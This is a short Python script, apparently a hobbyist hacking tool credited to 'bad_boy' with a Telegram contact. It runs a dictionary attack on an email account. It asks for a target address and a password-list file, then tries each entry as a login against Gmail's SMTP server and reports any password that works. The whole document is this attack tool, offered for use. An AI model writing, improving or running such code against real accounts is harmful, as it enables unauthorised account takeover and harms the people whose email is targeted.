import os
import smtplib
smtpserver = smtplib.SMTP("smtp.gmail.com:587")
smtpserver.ehlo()
smtpserver.starttls()
red='\033[31m'
green='\033[32m'
orange='\033[33m'
pink='\033[95m'
print(f"{green}=============================")
print(f"{green}       made by bad_boy       ")
print(f"{green} my telegram id:@Bad_boy_468 ")
print(f"{green}=============================")
print(f"{orange}[1]start the hack")
print(f"{orange}[2]exit")
joker=int(input("[~]bad_boy==>"))
if joker == 1:
    g=input(f"{red}Enter Target Email : ")
    pss = input(f"{red}Enter password list name : ")
    pss=open(pss)
    for kinge in pss:
        try:
            smtpserver.login(g,kinge)
            print(f"{pink}[+]good! password found :) ==>",kinge)
            break
        except smtplib.SMTPAuthenticationError:
            print(f"{orange}[!]password not found :( ==>",kinge)
elif joker == 2:
    os.system("clear")
    print("exiting!!")
